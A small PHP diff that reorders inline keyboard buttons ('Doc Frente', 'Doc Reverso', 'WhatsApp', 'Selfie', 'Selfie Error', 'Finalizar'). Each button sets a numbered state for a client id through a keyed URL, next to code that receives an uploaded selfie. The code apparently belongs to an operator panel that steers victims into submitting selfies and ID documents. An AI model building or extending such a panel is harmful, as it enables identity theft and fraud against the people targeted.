@@ -62,13 +62,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['selfie'])) {
                     ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=7&key=$security_key"],
                 ],
                 [
+                    ['text' => '🆔 Doc Frente', 'url' => "$baseUrl?id=$cliente_id&estado=11&key=$security_key"],
+                    ['text' => '🆔 Doc Reverso', 'url' => "$baseUrl?id=$cliente_id&estado=12&key=$security_key"]
+                ],
+                [
                     ['text' => '📲 WhatsApp', 'url' => "$baseUrl?id=$cliente_id&estado=8&key=$security_key"],
                     ['text' => '🤳 Selfie', 'url' => "$baseUrl?id=$cliente_id&estado=9&key=$security_key"],
                     ['text' => '⚠️ Selfie Error', 'url' => "$baseUrl?id=$cliente_id&estado=10&key=$security_key"]
-                ],
-                [
-                    ['text' => '🆔 Doc Frente', 'url' => "$baseUrl?id=$cliente_id&estado=11&key=$security_key"],
-                    ['text' => '🆔 Doc Reverso', 'url' => "$baseUrl?id=$cliente_id&estado=12&key=$security_key"]
                 ]
             ]
         ];
